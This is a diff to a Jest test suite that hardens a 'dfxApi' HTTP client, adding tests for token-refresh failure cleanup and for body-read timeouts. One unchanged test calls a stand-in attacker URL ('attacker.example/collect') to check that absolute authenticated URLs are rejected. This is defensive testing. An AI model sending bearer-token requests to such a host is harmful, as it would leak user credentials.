@@ -48,6 +48,11 @@ describe('dfxApi request hardening', () => {
     })) as jest.Mock;
   });
 
+  afterEach(() => {
+    jest.useRealTimers();
+    dfxApi.setOnUnauthorized(async () => null);
+  });
+
   it('rejects absolute authenticated URLs to avoid bearer leakage', async () => {
     await expect(dfxApi.get('https://attacker.example/collect')).rejects.toMatchObject({
       code: 'INVALID_API_PATH',
@@ -117,6 +122,19 @@ describe('dfxApi request hardening', () => {
     expect(refresh).toHaveBeenCalledTimes(1);
   });
 
+  it('cleans up the pending response when token refresh rejects', async () => {
+    dfxApi.setOnUnauthorized(async () => {
+      throw new Error('refresh failed');
+    });
+    (globalThis.fetch as jest.Mock).mockResolvedValueOnce({
+      ok: false,
+      status: 401,
+      json: async () => ({ statusCode: 401, code: 'UNAUTHORIZED', message: 'Unauthorized' }),
+    });
+
+    await expect(dfxApi.get('/v1/user')).rejects.toThrow('refresh failed');
+  });
+
   it('aborts a request after the configured timeout', async () => {
     (globalThis.fetch as jest.Mock).mockImplementationOnce(
       (_url: string, init: RequestInit) =>
@@ -127,6 +145,35 @@ describe('dfxApi request hardening', () => {
     await expect(dfxApi.get('/v1/user', { timeoutMs: 1 })).rejects.toBeInstanceOf(
       DfxApiTimeoutError,
     );
+  });
+
+  it('keeps the timeout active while a successful response body is still hanging', async () => {
+    jest.useFakeTimers();
+    let bodyStarted!: () => void;
+    const started = new Promise<void>((resolve) => {
+      bodyStarted = resolve;
+    });
+    (globalThis.fetch as jest.Mock).mockImplementationOnce(
+      async (_url: string, init: RequestInit) =>
+        ({
+          ok: true,
+          status: 200,
+          text: () => {
+            bodyStarted();
+            return new Promise<string>((_resolve, reject) => {
+              init.signal?.addEventListener('abort', () => reject(new Error('body aborted')), {
+                once: true,
+              });
+            });
+          },
+        }) as unknown as Response,
+    );
+
+    const request = dfxApi.get('/v1/user', { timeoutMs: 25 });
+    await started;
+    jest.advanceTimersByTime(25);
+
+    await expect(request).rejects.toBeInstanceOf(DfxApiTimeoutError);
   });
 
   it('aborts a request when the caller signal aborts', async () => {
